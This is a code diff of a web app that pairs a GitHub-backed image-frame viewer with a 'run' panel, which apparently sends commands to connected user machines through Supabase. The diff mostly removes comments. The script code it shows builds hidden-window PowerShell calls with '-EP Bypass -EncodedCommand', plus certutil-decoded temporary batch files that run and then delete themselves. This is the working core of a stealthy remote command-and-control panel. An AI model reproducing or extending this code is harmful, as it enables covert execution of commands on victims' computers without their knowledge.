@@ -773,9 +773,6 @@
             background: none;
         }
 
-        /* ══════════════════════════════════════════
-           RUN VIEW
-        ══════════════════════════════════════════ */
         #view-run {
             display: none;
             flex: 1;
@@ -783,9 +780,7 @@
             overflow-y: auto;
             overflow-x: hidden;
             background: var(--run-bg, var(--bg));
-            /* fill remaining height */
             height: 0;
-            /* scrollbar */
             scrollbar-width: thin;
             scrollbar-color: var(--border-heavy) transparent;
         }
@@ -808,14 +803,12 @@
             padding: 2rem;
         }
 
-        /* grid of cards */
         .run-grid {
             display: grid;
             gap: 10px;
             grid-template-columns: repeat(auto-fill, minmax(280px, 1fr));
         }
 
-        /* user card — themed with --run-* vars */
         .user-card {
             background: var(--run-panel, var(--surface));
             border: 1px solid var(--run-border-subtle, var(--border));
@@ -1047,7 +1040,6 @@
             justify-content: center;
         }
 
-        /* ── Popup overlay (run) ── */
         .popup-overlay {
             backdrop-filter: blur(8px);
             background: var(--run-overlay, rgba(0, 0, 0, .9));
@@ -1381,9 +1373,6 @@
             pointer-events: auto;
         }
 
-        /* ══════════════════════════════════════════
-           ACTIVE VIEW TOGGLING
-        ══════════════════════════════════════════ */
         body.view-frames #view-frames {
             display: flex;
         }
@@ -1449,7 +1438,6 @@
             display: none;
         }
 
-        /* run-connect-wrap mirrors folder-dropdown-wrap style */
         .run-connect-wrap {
             position: relative;
             display: none;
@@ -1463,7 +1451,6 @@
             color: var(--run-status-yellow, #bdbdbd);
         }
 
-        /* ── Hamburger button (mobile only) ── */
         .hamburger-btn {
             display: none;
             font-size: 18px;
@@ -1482,7 +1469,6 @@
             background: var(--border);
         }
 
-        /* ── Sidebar ── */
         .sidebar-overlay {
             display: none;
             position: fixed;
@@ -1670,8 +1656,6 @@
             .hamburger-btn {
                 display: flex;
             }
-
-            /* hide desktop left-side run controls on mobile — use sidebar */
             body.view-run .run-connect-wrap {
                 display: none !important;
             }
@@ -1680,7 +1664,6 @@
                 display: none !important;
             }
 
-            /* hide file/theme dropdowns on mobile — use sidebar */
             body.view-frames .frames-header-right {
                 display: none !important;
             }
@@ -1689,24 +1672,14 @@
                 display: none !important;
             }
 
-            /* hide folder picker on mobile — use sidebar */
             body.view-frames .folder-dropdown-wrap {
                 display: none !important;
             }
 
-            /* hide desktop fps control on mobile — use sidebar */
             #fpsWrap {
                 display: none;
             }
-
-            /* on mobile, hide folder picker in run too (already hidden by view-run rule) */
         }
-
-        /* ══════════════════════════════════════════
-           MOBILE & RESPONSIVE LAYOUT
-        ══════════════════════════════════════════ */
-
-        /* ── Shared header mobile ── */
         @media (max-width: 600px) {
             header {
                 padding: 0 12px;
@@ -1720,7 +1693,6 @@
                 gap: 4px;
             }
 
-            /* folder btn shrinks + truncates */
             .folder-btn {
                 font-size: 11px;
                 padding: 0 8px;
@@ -1734,7 +1706,6 @@
                 display: block;
             }
 
-            /* file btn: hide filename text on mobile, show icon-like minimal label */
             .file-btn {
                 font-size: 11px;
                 padding: 0 10px;
@@ -1744,7 +1715,6 @@
                 display: none !important;
             }
 
-            /* show a short "FILE" label instead */
             .file-btn::after {
                 content: 'FILE';
                 font-family: 'Space Grotesk', sans-serif;
@@ -1752,9 +1722,6 @@
                 letter-spacing: .05em;
             }
 
-            /* run controls — handled by sidebar on mobile */
-
-            /* frames right side: cap fileName width on mobile */
             .frames-header-right {
                 display: flex;
                 align-items: stretch;
@@ -1773,7 +1740,6 @@
             }
         }
 
-        /* ── FRAMES controls row mobile ── */
         @media (max-width: 600px) {
             .controls-row {
                 padding: 0 10px;
@@ -1782,7 +1748,6 @@
                 min-height: 44px;
                 flex-wrap: wrap;
                 display: none;
-                /* overridden by JS when frames load */
                 overflow: visible;
                 position: sticky;
                 bottom: 0;
@@ -1790,16 +1755,13 @@
                 z-index: 20;
             }
 
-            /* when JS sets it to flex, keep mobile layout */
             .controls-row[style*="flex"] {
                 display: flex !important;
             }
 
             .slider-wrap {
                 order: -1;
-                /* slider goes to the top */
                 flex: 0 0 100%;
-                /* full width */
                 padding: 6px 0 0;
             }
 
@@ -1833,13 +1795,10 @@
                 min-width: 72px;
             }
 
-            /* zoom hint too long for mobile */
             .zoom-hint {
                 display: none;
             }
         }
-
-        /* ── RUN view mobile ── */
         @media (max-width: 600px) {
             .run-panel {
                 padding: 0.75rem;
@@ -1886,12 +1845,9 @@
                 touch-action: manipulation;
             }
 
-            /* hide keyboard hints on mobile */
             .btn-hint {
                 display: none;
             }
-
-            /* popup slides up from bottom on mobile */
             .popup-overlay {
                 align-items: flex-end;
                 padding: 0;
@@ -1957,7 +1913,6 @@
             }
         }
 
-        /* ── Tablet tweaks ── */
         @media (min-width: 601px) and (max-width: 900px) {
             .run-grid {
                 gap: 14px;
@@ -1988,20 +1943,17 @@
                 <span class="brand-sep">//</span>
                 <span id="brandRun">RUN</span>
             </div>
-            <!-- folder picker — only visible in frames mode -->
             <div class="folder-dropdown-wrap" id="folderWrap">
                 <button class="folder-btn" id="folderBtn">
                     <span id="folderName">loading...</span>
                 </button>
                 <div class="dropdown-menu" id="dropdownMenu"></div>
             </div>
-            <!-- connect button — only visible in run mode -->
             <div class="run-connect-wrap" id="runConnectWrap">
                 <button class="folder-btn" id="run-connect-btn">connect</button>
             </div>
         </div>
         <div class="header-right">
-            <!-- frames right controls -->
             <div class="frames-header-right">
                 <div class="file-dropdown-wrap" id="fileWrap">
                     <button class="file-btn" id="fileBtn">
@@ -2012,7 +1964,6 @@
                     </div>
                 </div>
             </div>
-            <!-- run right controls: theme dropdown mirrors file-dropdown-wrap -->
             <div class="run-theme-wrap file-dropdown-wrap" id="runThemeWrap">
                 <button class="file-btn" id="run-theme-btn">
                     <span id="run-theme-label">night</span>
@@ -2027,12 +1978,10 @@
                     <div class="file-dropdown-item" data-theme-val="polar">Polar</div>
                 </div>
             </div>
-            <!-- hamburger — mobile only -->
             <button class="hamburger-btn" id="hamburgerBtn" aria-label="Menu">&#9776;</button>
         </div>
     </header>
 
-    <!-- Mobile sidebar -->
     <div class="sidebar-overlay" id="sidebarOverlay"></div>
     <div class="sidebar" id="sidebar">
         <div class="sidebar-header">
@@ -2040,7 +1989,6 @@
             <button class="sidebar-close" id="sidebarClose">&#x2715;</button>
         </div>
         <div class="sidebar-body">
-            <!-- FRAMES section: download current frame -->
             <div class="sidebar-frames-section">
                 <div class="sidebar-section-label">folder</div>
                 <div class="sidebar-folder-list" id="sidebar-folder-list"></div>
@@ -2056,7 +2004,6 @@
                     <button class="sidebar-fps-btn" data-fps="30">30</button>
                 </div>
             </div>
-            <!-- RUN section: connect + theme -->
             <div class="sidebar-run-section">
                 <div class="sidebar-section-label">connection</div>
                 <button class="sidebar-row-btn" id="sidebar-connect-btn">connect</button>
@@ -2075,9 +2022,6 @@
         </div>
     </div>
 
-    <!-- ══════════════════════════════════════════
-         FRAMES VIEW
-    ══════════════════════════════════════════ -->
     <div id="view-frames">
         <div class="image-area" id="imageArea">
             <div id="frames-status-msg">scanning repository...</div>
@@ -2112,9 +2056,6 @@
         </div>
     </div>
 
-    <!-- ══════════════════════════════════════════
-         RUN VIEW
-    ══════════════════════════════════════════ -->
     <div id="view-run">
         <div class="run-panel">
             <div class="run-grid" id="user-grid">
@@ -2123,7 +2064,6 @@
         </div>
     </div>
 
-    <!-- Popup overlay (run) -->
     <div class="popup-overlay" id="popup-overlay">
         <div class="popup-box">
             <div class="popup-header">
@@ -2196,7 +2136,6 @@
         </div>
     </div>
 
-    <!-- ══ Module: Mode Switcher ══ -->
     <script id="mod-mode-switcher">
         (function () {
             const body = document.body;
@@ -2209,7 +2148,6 @@
                 body.classList.remove('view-frames', 'view-run');
                 body.classList.add('view-' + currentMode);
 
-                // when switching to frames, restore loading state if applicable
                 if (currentMode === 'frames') {
                     if (!framesBooted) { FramesApp.init(); framesBooted = true; }
                     if (FramesApp.onShow) FramesApp.onShow();
@@ -2223,7 +2161,6 @@
                 }
             });
 
-            // expose so frames can update loading class
             window.__setFramesLoading = (on) => {
                 if (currentMode === 'frames') {
                     body.classList.toggle('is-loading', on);
@@ -2233,7 +2170,6 @@
         })();
     </script>
 
-    <!-- ══ Module: Frames App ══ -->
     <script id="mod-frames-app">
         const FramesApp = (() => {
             const user = "yuan-miranda", repo = "frames";
@@ -2290,7 +2226,6 @@
                     'fileName', 'progressWrap', 'progressBar', 'folderBtn', 'folderName', 'dropdownMenu',
                     'playBtn', 'fpsWrap', 'fpsBtn', 'fpsMenu', 'fpsLabel', 'fileBtn', 'fileDropdownMenu', 'downloadItem', 'prevBtn', 'nextBtn']
                     .forEach(k => els[k.replace(/-/g, '').replace('framesstatusmsg', 'statusmsg')] = $(k));
-                // fix status msg alias
                 els.statusmsg = $('frames-status-msg');
                 if (els.fpsBtn) {
                     const v = parseInt(els.fpsBtn.dataset.fps || '12', 10);
@@ -2450,6 +2385,7 @@
             }
 
             async function fetchWithAuth(url) {
+                // Requires a valid GitHub token; fail fast to avoid unauthenticated API calls.
                 if (!githubToken) throw new Error('missing github token');
                 return fetch(url, { headers: { Authorization: 'Bearer ' + githubToken } });
             }
@@ -2464,6 +2400,7 @@
                 if (!url) return;
                 const name = state.imagesMeta[state.idx] ? state.imagesMeta[state.idx].name : 'frame.png';
                 try {
+                    // Fetch as blob to force a direct download instead of opening a new tab.
                     const res = await fetch(url, { mode: 'cors' });
                     if (!res.ok) throw new Error('download failed');
                     const blob = await res.blob();
@@ -2699,7 +2636,6 @@
                 setupPanZoom();
             }
 
-            /* PAN / ZOOM */
             const view = { scale: 1, ox: 0, oy: 0 };
             let drag = { active: false, startX: 0, startY: 0, startOx: 0, startOy: 0 };
             let zoomHideTimer = null;
@@ -2851,7 +2787,6 @@
         })();
     </script>
 
-    <!-- ══ Module: Run App ══ -->
     <script id="mod-run-app">
         const RunApp = (() => {
             const runState = {
@@ -2997,15 +2932,12 @@
                 document.documentElement.dataset.theme = nextTheme;
                 localStorage.setItem('run_theme', runState.themeSelection);
                 updateRandomThemeOptionLabel(nextTheme);
-                // update custom dropdown label
                 const lbl = document.getElementById('run-theme-label');
                 if (lbl) lbl.textContent = usingRandom ? `random (${formatThemeLabel(nextTheme)})` : nextTheme;
                 sizeRunThemeSelect();
-                // update desktop dropdown active state
                 document.querySelectorAll('#runThemeMenu .file-dropdown-item').forEach(item => {
                     item.classList.toggle('active', item.dataset.themeVal === runState.themeSelection);
                 });
-                // update sidebar active
                 document.querySelectorAll('.sidebar-theme-btn').forEach(btn => {
                     btn.classList.toggle('active', btn.dataset.themeVal === runState.themeSelection);
                 });
@@ -3280,6 +3212,7 @@
             function wrapPowershell(val, hidden = true) {
                 const utf16 = new Uint8Array(val.length * 2);
                 for (let i = 0; i < val.length; i++) { const c = val.charCodeAt(i); utf16[i * 2] = c & 0xff; utf16[i * 2 + 1] = (c >> 8) & 0xff; }
+                // PowerShell expects UTF-16LE encoded payloads for -EncodedCommand.
                 return `powershell -NoP -EP Bypass -W ${hidden ? 'H' : 'Normal'} -EncodedCommand ${bytesToBase64(utf16)}`;
             }
             function normalizePsPauseCommands(val) { return val.replace(/^\s*pause\s*$/gim, "Read-Host 'Press Enter to continue'"); }
@@ -3292,6 +3225,7 @@
                 if (!val.includes('\n')) return val;
                 const utf8 = new TextEncoder().encode(val);
                 const b64 = bytesToBase64(utf8);
+                // Use a temp .bat file to preserve multi-line CMD scripts.
                 return `cmd /c "echo ${b64}>%temp%\\r.b64 && certutil -decode %temp%\\r.b64 %temp%\\r.bat >nul && cmd /c %temp%\\r.bat && del %temp%\\r.b64 %temp%\\r.bat"`;
             }
 
@@ -3316,6 +3250,7 @@
                     }
                 }
                 const body = {};
+                // Encode the outbound command for transport/storage in Supabase.
                 if (rawCmd) { body.cmd = btoa(rawCmd); body.run = true; }
                 if (mode === 'cmd') body.visible = runState.selectedVis;
                 try {
@@ -3363,7 +3298,6 @@
                 applyTheme(runState.themeSelection);
                 setConnectionState(false);
 
-                // custom theme dropdown (desktop — mirrors file-dropdown-wrap pattern)
                 const themeBtn = $('run-theme-btn');
                 const themeMenu = $('runThemeMenu');
                 if (themeBtn && themeMenu) {
@@ -3387,7 +3321,6 @@
                     });
                 }
 
-                // connect buttons (desktop + sidebar)
                 function handleConnect() {
                     if (runState.isConnected) { disconnectAndReset(); return; }
                     promptAndConnect();
@@ -3397,12 +3330,10 @@
                 const sidebarConnectBtn = $('sidebar-connect-btn');
                 if (sidebarConnectBtn) sidebarConnectBtn.addEventListener('click', handleConnect);
 
-                // sidebar theme buttons
                 document.querySelectorAll('.sidebar-theme-btn').forEach(btn => {
                     btn.addEventListener('click', () => { applyTheme(btn.dataset.themeVal); });
                 });
 
-                // sidebar download button (frames mode)
                 const sidebarDownload = $('sidebar-download-btn');
                 if (sidebarDownload) {
                     sidebarDownload.addEventListener('click', async () => {
@@ -3411,7 +3342,6 @@
                     });
                 }
 
-                // hamburger / sidebar
                 const hamburger = $('hamburgerBtn');
                 const sidebar = $('sidebar');
                 const overlay = $('sidebarOverlay');
